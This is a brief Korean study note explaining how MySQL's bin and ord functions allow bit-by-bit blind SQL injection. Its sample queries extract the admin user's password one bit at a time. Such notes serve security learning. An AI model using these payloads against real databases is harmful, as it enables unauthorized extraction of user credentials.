### Bit 연산
- ASCII는 0~127 범위의 문자를 표현할 수 있음. 7개의 비트를 통해 하나의 문자를 나타내므로 7개의 비트에 대해 1인지 비교하면 빠르게 임의 데이터의 한 바이트 알아낼 수 있음.    
- MySQL에서는 숫자를 비트 형태로 변환하는 bin 함수 제공
    ```sql
    select bin(ord('A'));
    // 1000001
    ```
- 비트 연산 통한 Blind SQL Injection
```sql
//7번 반복하면 한 바이트 문자 알아낼 수 있음.
select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
..
```
